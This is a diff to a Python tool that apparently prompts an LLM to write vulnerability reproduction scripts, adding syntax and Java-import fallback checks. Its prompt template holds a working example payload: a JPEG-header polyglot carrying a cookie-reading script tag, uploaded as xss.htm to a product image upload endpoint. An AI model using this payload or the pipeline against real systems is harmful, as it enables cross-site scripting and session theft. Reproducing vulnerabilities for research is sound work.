@@ -44,12 +44,13 @@ ABSOLUTE RULES:
 - ONLY use: requests, urllib3, io, os, sys, re, struct, time
 
 CORRECT way to build and upload a file payload:
-  jpeg_header = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10]) + b'A'*500
+  jpeg_header = bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10]) + b"A"*500
+  # ALWAYS use double-quoted bytes for HTML/JS payloads (single quotes break Python if payload contains apostrophes)
   html_tail   = b"\\n<script>document.write(document.cookie)</script>\\n"
   payload_bytes = jpeg_header + html_tail          # in-memory, no disk file
-  files = {'file': ('xss.htm', payload_bytes, 'image/jpeg')}
+  files = {"file": ("xss.htm", payload_bytes, "image/jpeg")}
   r = session.post(f"{BASE}/catalog/control/UploadProductImage",
-                   files=files, params={'productId': product_id, 'up_load_file_type': 'original'})
+                   files=files, params={"productId": product_id, "up_load_file_type": "original"})
 """
 
     prompt = f"""## Vulnerability
@@ -113,10 +114,21 @@ Return the COMPLETE script (all steps) in a single ```python block.
     # Safety: reject Java imports
     java_import = re.search(r'^\s*(?:from|import)\s+(?:com|org|java|javax)\.', code, re.MULTILINE)
     if java_import:
-        return _error_report(
-            vuln_description,
-            f"LLM generated Java import: `{java_import.group(0).strip()}`. "
-            "This is a Python script, not Java. Re-run reproduce."
+        print(f"[!] Java import detected — falling back to skeleton stub")
+        code = skeleton.replace(
+            "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
+            "print('[!] LLM generated Java imports — Step 2 needs manual implementation')"
+        )
+
+    # Safety: compile() check — catches LLM-introduced syntax errors
+    try:
+        compile(code, "repro_test.py", "exec")
+    except SyntaxError as e:
+        print(f"[!] LLM generated syntactically invalid Python: {e}")
+        print("[!] Falling back to skeleton with stub Step 2")
+        code = skeleton.replace(
+            "# [LLM: insert payload bytes construction + upload + any prerequisite steps here]",
+            f"print('[!] LLM Step 2 had syntax error: {str(e).replace(chr(39), chr(34))} — manual implementation needed')"
         )
 
     code = _patch_ssl_verify(code)
